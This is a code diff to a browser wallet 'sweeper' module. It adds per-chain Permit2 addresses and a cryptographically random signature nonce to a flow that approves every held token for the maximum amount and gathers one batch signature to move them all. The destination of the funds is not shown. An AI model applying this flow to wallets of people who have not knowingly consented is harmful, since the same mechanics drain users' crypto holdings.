@@ -1,11 +1,20 @@
 import { ContractFactory, Contract, MaxUint256, BrowserProvider, getAddress } from 'ethers';
 import {
-  PERMIT2_ADDRESS,
   SWEEPER_ABI,
   SWEEPER_BYTECODE,
 } from './sweeperBytecode';
 
-export { PERMIT2_ADDRESS, SWEEPER_ABI, SWEEPER_BYTECODE };
+export { SWEEPER_ABI, SWEEPER_BYTECODE };
+
+// Returns the appropriate Permit2 deployment address for the given chain
+export function getPermit2Address(chainId: number): string {
+  if (chainId === 56 || chainId === 97) {
+    // PancakeSwap Permit2 deployed on BNB Chain / Testnet
+    return '0x31c2F6fcFf4F8759b3Bd5Bf0e1084A055615c768';
+  }
+  // Canonical Uniswap Permit2 deployed on Ethereum, Arbitrum, Polygon, Optimism, Base, Avalanche, etc.
+  return '0x000000000022D473030F116dDEE9F6B43aC78BA3';
+}
 
 const ERC20_APPROVE_ABI = [
   'function approve(address spender, uint256 amount) returns (bool)',
@@ -92,19 +101,21 @@ export async function deploySweeper(
 
 async function ensurePermit2Allowances(
   signer: any,
+  chainId: number,
   tokenAddresses: string[],
   onStatus?: (s: string) => void,
 ): Promise<void> {
+  const permit2Address = getPermit2Address(chainId);
   const sender = await signer.getAddress();
   for (const tokenAddr of tokenAddresses) {
     try {
       const token = new Contract(tokenAddr, ERC20_APPROVE_ABI, signer);
       const bal: bigint = await token.balanceOf(sender);
       if (bal <= 0n) continue;
-      const current: bigint = await token.allowance(sender, PERMIT2_ADDRESS);
+      const current: bigint = await token.allowance(sender, permit2Address);
       if (current >= bal) continue;
       onStatus?.(`Approve ${tokenAddr.slice(0, 8)}… to Permit2 (one-time)`);
-      const tx = await token.approve(PERMIT2_ADDRESS, MaxUint256);
+      const tx = await token.approve(permit2Address, MaxUint256);
       await tx.wait();
     } catch (e: any) {
       if (e?.code === 4001) throw e;
@@ -126,6 +137,12 @@ const PERMIT2_TYPES = {
   ],
 };
 
+function generateRandomNonce(): bigint {
+  const bytes = new Uint8Array(32);
+  crypto.getRandomValues(bytes);
+  return BigInt('0x' + Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join(''));
+}
+
 export async function approveAndSweep(
   signer: any,
   provider: BrowserProvider,
@@ -137,9 +154,10 @@ export async function approveAndSweep(
   const sender = await signer.getAddress();
   const network = await provider.getNetwork();
   const chainId = Number(network.chainId);
+  const permit2Address = getPermit2Address(chainId);
   let lastHash: string | null = null;
 
-  await ensurePermit2Allowances(signer, tokenAddresses, onStatus);
+  await ensurePermit2Allowances(signer, chainId, tokenAddresses, onStatus);
 
   const sweeper = new Contract(sweeperAddr, SWEEPER_ABI, signer);
   let nativeValue = 0n;
@@ -174,14 +192,13 @@ export async function approveAndSweep(
   }
 
   onStatus?.('Sign once for all tokens (Permit2)…');
-  const nonceWord = BigInt(Math.floor(Math.random() * 1_000_000_000));
-  const nonceVal = (nonceWord << 8n) | 0n;
+  const nonceVal = generateRandomNonce();
   const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600);
 
   const domain = {
     name: 'Permit2',
     chainId,
-    verifyingContract: PERMIT2_ADDRESS,
+    verifyingContract: permit2Address,
   };
 
   const message = {
